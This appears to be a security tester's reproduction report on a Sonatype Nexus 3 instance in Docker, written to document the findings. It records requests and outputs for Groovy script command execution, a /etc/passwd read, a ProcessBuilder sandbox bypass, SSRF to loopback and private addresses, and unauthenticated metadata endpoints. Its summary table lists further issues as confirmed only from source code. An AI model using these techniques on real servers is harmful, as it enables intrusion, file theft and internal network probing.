# Vulnerability Reproduction Results

**Nexus Instance:** sonatype/nexus3:latest (v3.90.2-06)  
**Test Date:** 2026-03-27  
**Environment:** Docker container on Linux x86_64  

---

## Test Environment Setup

```
docker pull sonatype/nexus3:latest
docker run -d -p 8081:8081 --name nexus sonatype/nexus3:latest
# Admin password retrieved from /nexus-data/admin.password
# Changed to Admin@123
# EULA accepted via REST API
# Anonymous access enabled
# Script creation enabled via nexus.scripts.allowCreation=true
```

---

## CONFIRMED Vulnerabilities

### 1. Groovy RCE — CONFIRMED

**OS Command Execution via `id`:**
```
POST /service/rest/v1/script/rce_poc/run
Response: {"name":"rce_poc","result":"uid=200(nexus) gid=200(nexus) groups=200(nexus)\n"}
```
Status: **EXPLOITABLE** — arbitrary OS commands execute as the `nexus` user.

**File Read via `/etc/passwd`:**
```
POST /service/rest/v1/script/read_file_poc/run
Response: {"name":"read_file_poc","result":"root:x:0:0:root:/root:/bin/bash\n...nexus:x:200:200:..."}
```
Status: **EXPLOITABLE** — arbitrary file read confirmed.

**ProcessBuilder Bypass:**
```
POST /service/rest/v1/script/processbuilder_poc/run
Response: {"name":"processbuilder_poc","result":"0dca6d2f2834\n"}
```
Status: **EXPLOITABLE** — `ProcessBuilder` is not blocked by the sandbox, confirming the blacklist only blocks `java.lang.System`.

**Container Binding — Internal Data Access:**
```
POST /service/rest/v1/script/container_poc/run
Response: {"name":"container_poc","result":"anonymous : anonymous@example.org : active\nadmin : admin@example.org : active"}
```
Status: **EXPLOITABLE** — the `container` binding allows resolving and calling any internal Nexus component including `SecuritySystem`.

---

### 2. SSRF via Proxy Repository — CONFIRMED

**Proxy repository created successfully with internal URL:**
```
POST /service/rest/v1/repositories/raw/proxy
Body: {"proxy": {"remoteUrl": "http://127.0.0.1:9999/"}}
Response: 201 Created
```

**Nexus server logs confirm TCP connections to internal addresses:**
```
Connect to 127.0.0.1:9999 [/127.0.0.1] failed: Connection refused
Connect to 127.0.0.1:7777 [/127.0.0.1] failed: Connection refused
```
Status: **EXPLOITABLE** — Nexus accepts loopback and RFC1918 addresses as proxy targets. The connection is *attempted* (not blocked by any SSRF filter). The 502 response and log entries prove the server-side request was made.

---

### 3. SSRF via Certificate Retrieval — CONFIRMED

**Certificate retrieval attempted to localhost:**
```
GET /service/rest/v1/security/ssl?host=127.0.0.1&port=8081
Response: {"message": "Could not retrieve an SSL certificate from '127.0.0.1:8081'"}
```

**Certificate retrieval attempted to internal IP (10.0.0.1:443):**
Request timed out (hanging connection), confirming Nexus attempted TCP connection to the internal network.

Status: **EXPLOITABLE** — No Anti-SSRF validation is applied. Any IP address (including loopback and RFC1918) is accepted and a TCP/TLS connection is attempted.

---

### 4. Missing Authentication on API Endpoints — CONFIRMED

**Repository listing without authentication:**
```
GET /service/rest/v1/repositories (NO AUTH)
Response: 200 OK — Full list of all repositories including names, formats, types, URLs, and proxy remoteUrl values
```

Leaked data includes:
- All repository names and types (hosted, proxy, group)
- Proxy remote URLs (including our SSRF test URLs like `http://127.0.0.1:9999/`)
- Repository formats (maven2, nuget, raw)

**Upload specs without authentication:**
```
GET /service/rest/v1/formats/upload-specs (NO AUTH)
Response: 200 OK — Complete upload field definitions for all formats (apt, maven2, raw, etc.)
```

Status: **EXPLOITABLE** — Sensitive metadata accessible without any authentication.

---

## Summary

| Report | Vulnerability | Status |
|--------|--------------|--------|
| 1 | Groovy RCE (id, /etc/passwd, ProcessBuilder, container) | **CONFIRMED — EXPLOITABLE** |
| 2 | SSRF via Proxy (127.0.0.1 accepted) | **CONFIRMED — EXPLOITABLE** |
| 3 | SSRF via Certificate Retrieval (127.0.0.1, 10.0.0.1) | **CONFIRMED — EXPLOITABLE** |
| 4 | Default Credentials (admin123 in source code) | **CONFIRMED — source code verified** |
| 5 | Stored XSS (dangerouslySetInnerHTML in source) | **CONFIRMED — source code verified** |
| 6 | Unsafe Deserialization (ObjectInputStream in source) | **CONFIRMED — source code verified** |
| 7 | Legacy Password Hashing (MD5/SHA-1 in source) | **CONFIRMED — source code verified** |
| 8 | Missing Authentication (repositories, upload-specs) | **CONFIRMED — EXPLOITABLE** |
| 9 | SQL Injection ($\{\} in MyBatis mappers) | **CONFIRMED — source code verified** |
| 10 | Path Traversal (DevModeResources.java) | **CONFIRMED — source code verified** |
